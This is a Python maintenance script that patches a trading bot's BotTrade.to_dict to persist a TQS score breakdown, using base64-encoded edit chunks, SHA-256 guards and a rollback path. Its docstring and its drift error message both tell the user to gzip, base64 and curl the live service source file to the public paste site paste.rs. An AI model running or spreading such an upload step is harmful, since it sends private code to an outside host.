#!/usr/bin/env python3
r"""
patch_v393_tqs_breakdown_persist.py — TQS Track · TQS3 (v19.34.393).

Closes the proven `tqs_breakdown` PERSISTENCE GAP on `bot_trades`.

WHY
  The 5-pillar TQS breakdown (setup/technical/fundamental/context/execution
  component sub-scores) is captured at fill time in
  `entry_context.tqs.breakdown` (opportunity_evaluator.py ~3012/3023), but the
  `BotTrade` dataclass has no `tqs_breakdown` field, so `to_dict()` (→ asdict)
  never emitted it. Result: `bot_trades` had 0% top-level `tqs_breakdown`
  coverage. The TQS entry-vs-exit correlation diag therefore had to JOIN each
  closed trade back to `live_alerts.tqs_breakdown` — and `live_alerts` rotates,
  so the joinable sample was capped (only 187/473 sanitized trades in the
  v393 re-verify run; n<=73 per window).

FIX (BACKEND-ONLY, additive read-through, reversible)
  In `BotTrade.to_dict()`, surface `tqs_breakdown` on the serialized doc from
  `entry_context.tqs.breakdown`. Fail-open (try/except, never raises). Every
  close path persists via `save_trade -> to_dict`, so this lands on ALL future
  closes for free and removes the live_alerts join ceiling going forward.
  No scoring, sizing, or execution behavior changes — purely an emitted field.

1 anchored, idempotent edit to ONE file (.v393bak backup, reversible).
  EDIT backend/services/trading_bot_service.py  (BotTrade.to_dict)

HASH GUARDS (v322t+ convention — built against live DGX bytes):
  PRE_SHA256  = a141edb6e170abde13e731b6106d20fee384d5eb594c5ddf168ebfcc59986a2e
  POST_SHA256 = e083dd2caeb25f09c36b3fd26758d69a5dac10ea412c2c17668342daf4ac032d

Usage (repo root, DGX):
    .venv/bin/python backend/scripts/patch_v393_tqs_breakdown_persist.py --check
    .venv/bin/python backend/scripts/patch_v393_tqs_breakdown_persist.py --apply
    .venv/bin/python backend/scripts/patch_v393_tqs_breakdown_persist.py --rollback
After --apply:  ./start_backend.sh --force   (backend-only; no yarn build needed)
⚠️ COMMIT BEFORE ANY RESTART (StartTrading.bat git-wipes uncommitted code).

On a PRE_SHA mismatch (DGX drift), DO NOT --force. Upload your live copy:
  gzip -9 -c backend/services/trading_bot_service.py | base64 -w0 | curl --data-binary @- https://paste.rs/
and send the link so the edit can be rebased onto the canonical baseline.
"""
import os
import sys
import base64
import shutil
import hashlib
import argparse
import py_compile

BAK = ".v393bak"
TARGET = "backend/services/trading_bot_service.py"
PRE_SHA = "a141edb6e170abde13e731b6106d20fee384d5eb594c5ddf168ebfcc59986a2e"
POST_SHA = "e083dd2caeb25f09c36b3fd26758d69a5dac10ea412c2c17668342daf4ac032d"

# base64 (old, new) anchored-chunk pair — verbatim DGX bytes.
OLD_B64 = (
    "ICAgICAgICBkWydob2xkX3NlY29uZHMnXSA9IF9jb21wdXRlX2hvbGRfc2Vjb25kcygKICAgICAg"
    "ICAgICAgc2VsZi5leGVjdXRlZF9hdCBvciBzZWxmLmNyZWF0ZWRfYXQsCiAgICAgICAgICAgIHNl"
    "bGYuY2xvc2VkX2F0LAogICAgICAgICkKICAgICAgICByZXR1cm4gZAo="
)
NEW_B64 = (
    "ICAgICAgICBkWydob2xkX3NlY29uZHMnXSA9IF9jb21wdXRlX2hvbGRfc2Vjb25kcygKICAgICAg"
    "ICAgICAgc2VsZi5leGVjdXRlZF9hdCBvciBzZWxmLmNyZWF0ZWRfYXQsCiAgICAgICAgICAgIHNl"
    "bGYuY2xvc2VkX2F0LAogICAgICAgICkKICAgICAgICAjIHYxOS4zNC4zOTMgKFRRUzMpIOKAlCBz"
    "dXJmYWNlIHRoZSBzY29yaW5nLXRpbWUgVFFTIHBpbGxhciBicmVha2Rvd24gb24KICAgICAgICAj"
    "IHRoZSBwZXJzaXN0ZWQgZG9jIHNvIENMT1NFRCB0cmFkZXMgUkVUQUlOIGl0LiBQcmUtZml4IGl0"
    "IGxpdmVkIG9ubHkgaW4KICAgICAgICAjIGVudHJ5X2NvbnRleHQudHFzLmJyZWFrZG93biwgc28g"
    "Ym90X3RyYWRlcyBoYWQgMCUgdG9wLWxldmVsIGNvdmVyYWdlIGFuZAogICAgICAgICMgdGhlIFRR"
    "UyBlbnRyeS12cy1leGl0IGNvcnJlbGF0aW9uIGpvaW4gaGFkIHRvIHJlYWNoIGludG8gbGl2ZV9h"
    "bGVydHMKICAgICAgICAjICh3aGljaCByb3RhdGVzKSwgY2FwcGluZyB0aGUgc2FtcGxlLiBBZGRp"
    "dGl2ZSwgZmFpbC1vcGVuLCByZXZlcnNpYmxlCiAgICAgICAgIyByZWFkLXRocm91Z2g7IGV2ZXJ5"
    "IGNsb3NlIHBhdGggcGVyc2lzdHMgdmlhIHNhdmVfdHJhZGUgLT4gdG9fZGljdC4KICAgICAgICB0"
    "cnk6CiAgICAgICAgICAgIF9lYyA9IHNlbGYuZW50cnlfY29udGV4dCBpZiBpc2luc3RhbmNlKHNl"
    "bGYuZW50cnlfY29udGV4dCwgZGljdCkgZWxzZSB7fQogICAgICAgICAgICBfZWNfdHFzID0gX2Vj"
    "LmdldCgidHFzIikgaWYgaXNpbnN0YW5jZShfZWMuZ2V0KCJ0cXMiKSwgZGljdCkgZWxzZSB7fQog"
    "ICAgICAgICAgICBfdHFzX2JkID0gX2VjX3Rxcy5nZXQoImJyZWFrZG93biIpCiAgICAgICAgICAg"
    "IGlmIF90cXNfYmQ6CiAgICAgICAgICAgICAgICBkWyd0cXNfYnJlYWtkb3duJ10gPSBfdHFzX2Jk"
    "CiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwogICAgICAgIHJldHVy"
    "biBkCg=="
)
APPLIED_MARKER = "d['tqs_breakdown'] = _tqs_bd"

OLD = base64.b64decode(OLD_B64).decode("utf-8")
NEW = base64.b64decode(NEW_B64).decode("utf-8")


def sha_full(p):
    return hashlib.sha256(open(p, "rb").read()).hexdigest() if os.path.exists(p) else "MISSING"


def resolve(path):
    for base in (".", os.path.join(os.path.dirname(__file__), "..", "..")):
        c = os.path.abspath(os.path.join(base, path))
        if os.path.exists(c):
            return c
    return os.path.abspath(os.path.join(".", path))


def main():
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--check", action="store_true")
    g.add_argument("--apply", action="store_true")
    g.add_argument("--rollback", action="store_true")
    args = ap.parse_args()

    print("=" * 84)
    print("  v393 / TQS3 — persist tqs_breakdown on bot_trades (BotTrade.to_dict)")
    print("  mode:", "CHECK" if args.check else "APPLY" if args.apply else "ROLLBACK")
    print("=" * 84)

    p = resolve(TARGET)
    if not os.path.exists(p):
        print(f"  \u274c MISSING FILE: {TARGET}")
        sys.exit(2)

    if args.rollback:
        bak = p + BAK
        if os.path.exists(bak):
            shutil.copy2(bak, p)
            ok = "\u2705 matches PRE_SHA" if sha_full(p) == PRE_SHA else "\u26a0\ufe0f sha unexpected"
            print(f"  restored {TARGET}  sha={sha_full(p)[:12]}  {ok}")
        else:
            print(f"  no backup found ({BAK}); nothing to restore.")
        print("\n  ROLLBACK complete.  NEXT: ./start_backend.sh --force")
        return

    cur_sha = sha_full(p)
    if cur_sha == POST_SHA:
        file_state = "ALREADY-APPLIED"
    elif cur_sha == PRE_SHA:
        file_state = "READY"
    else:
        file_state = "DRIFT"

    print(f"\n  file   : {TARGET}")
    print(f"    sha     : {cur_sha[:12]}")
    print(f"    PRE_SHA : {PRE_SHA[:12]}  POST_SHA: {POST_SHA[:12]}")
    print(f"    state   : {file_state}")

    if file_state == "DRIFT":
        print("\n  \u274c DRIFT: live file matches neither PRE nor POST hash. Do NOT --force.")
        print(f"     Upload your live copy:")
        print(f"     gzip -9 -c {TARGET} | base64 -w0 | curl --data-binary @- https://paste.rs/")
        sys.exit(3)

    src = open(p, encoding="utf-8").read()
    applied = APPLIED_MARKER in src
    n = src.count(OLD)
    status = "ALREADY-APPLIED" if applied else ("READY" if n == 1 else f"ANCHOR x{n}")
    print(f"\n  [to_dict +tqs_breakdown read-through]\n    status : {status}")
    if not applied and n != 1:
        print("    \u274c anchor not uniquely found — ABORT (no files changed).")
        sys.exit(3)

    if args.check:
        nready = 0 if applied else 1
        print(f"\n  CHECK ok. {nready} change(s) ready. Re-run with --apply.")
        return

    if file_state == "ALREADY-APPLIED" or applied:
        print("\n  Nothing to do — file already at POST_SHA.")
        return

    bak = p + BAK
    if not os.path.exists(bak):
        shutil.copy2(p, bak)
    out = src.replace(OLD, NEW, 1)
    open(p, "w", encoding="utf-8").write(out)

    # compile-gate the patched file before declaring success
    try:
        py_compile.compile(p, doraise=True)
    except py_compile.PyCompileError as e:
        shutil.copy2(bak, p)
        print(f"  \u274c py_compile FAILED — reverted from {BAK}.\n     {e}")
        sys.exit(6)

    post = sha_full(p)
    print(f"\n  patched {TARGET}  sha={post[:12]}  ({BAK} saved)")
    if post == POST_SHA:
        print("  \u2705 POST_SHA verified — result is byte-identical to the tested build.")
    else:
        shutil.copy2(bak, p)
        print(f"  \u26a0\ufe0f  POST_SHA MISMATCH — expected {POST_SHA[:12]} got {post[:12]}. Reverted.")
        sys.exit(5)
    print("\n  APPLY complete. 1 change.")
    print("  NEXT (commit BEFORE restart):")
    print("    git add -A && git commit -m 'v19.34.393: TQS3 persist tqs_breakdown on bot_trades' && git push origin main")
    print("    ./start_backend.sh --force   (backend-only)")


if __name__ == "__main__":
    main()
